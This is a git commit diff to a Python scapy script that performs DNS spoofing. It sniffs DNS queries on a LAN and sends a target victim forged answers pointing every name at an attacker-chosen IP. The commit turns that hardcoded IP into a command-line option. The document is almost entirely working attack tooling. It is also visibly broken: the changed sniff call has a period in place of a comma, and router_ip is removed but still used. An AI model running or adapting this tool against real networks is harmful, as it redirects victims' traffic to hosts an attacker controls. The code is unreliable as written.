c07f8c79c6da9a1b82d2a3ffbf320e53d89c490c
Emilie Zhang <emilie.m.zhang@gmail.com>
2021-02-28 18:23:03 -0800

    Add spoof ip

--- new-dns-spoof.py
+++ new-dns-spoof.py
@@ -3,7 +3,7 @@
 from scapy.all import *
 import argparse
 
-def dns_responder(local_ip: str, victim_ip: str, router_ip: str):
+def dns_responder(local_ip: str, victim_ip: str, router_ip: str, spoof_ip: str):
 
     def get_response(pkt: IP):
         if (
@@ -12,7 +12,7 @@ def dns_responder(local_ip: str, victim_ip: str, router_ip: str):
             pkt[DNS].ancount == 0
         ):
             if str(pkt["DNS Question Record"].qname):
-                spf_resp = (IP(dst=victim_ip)/UDP(dport=pkt[UDP].sport,sport=53)/DNS(id=pkt[DNS].id,ancount=1,qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname,rdata="142.232.230.10")))
+                spf_resp = (IP(dst=victim_ip)/UDP(dport=pkt[UDP].sport,sport=53)/DNS(id=pkt[DNS].id,ancount=1,qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname,rdata=spoof_ip)))
                 send(spf_resp)
                 print(spf_resp.show())
                 return f"Spoofed DNS Response Sent: {pkt[IP].src}"
@@ -22,19 +22,18 @@ def dns_responder(local_ip: str, victim_ip: str, router_ip: str):
 
 if __name__ == "__main__":
     BPF_FILTER = f"udp port 53"
-    dns_responder_ip = "192.168.0.108"
-    dns_spoof_victim_ip = '192.168.0.107'
-    router_ip = '192.168.0.1'
 
     parser = argparse.ArgumentParser()
     parser.add_argument("-r", "--responder", dest="dns_responder_ip", help="DNS Responder IP")
     parser.add_argument("-t", "--target", dest="target_ip", help="DNS Spoof Victim IP")
     parser.add_argument("-i", "--interface", dest="network_interface", help="Network Interface")
+    parser.add_argument("-s", "--spoof-ip", dest="spoof_ip", help="Spoof IP address")
     args=parser.parse_args()
 
     dns_responder_ip = args.dns_responder_ip if args.dns_responder_ip else "192.168.0.108"
     dns_spoof_victim_ip = args.target_ip if args.target_ip else "192.168.0.108"
     network_interface = args.network_interface if args.network_interface else "enp0s3"
     dns_responder_ip = args.dns_responder_ip if args.dns_responder_ip else "192.168.0.108"
+    spoof_ip = args.spoof_ip if args.spoof_ip else "142.232.230.10"
 
-    sniff(filter=BPF_FILTER, prn=dns_responder(dns_responder_ip, dns_spoof_victim_ip, router_ip), iface=network_interface)
+    sniff(filter=BPF_FILTER, prn=dns_responder(dns_responder_ip, dns_spoof_victim_ip, router_ip. spoof_ip), iface=network_interface)
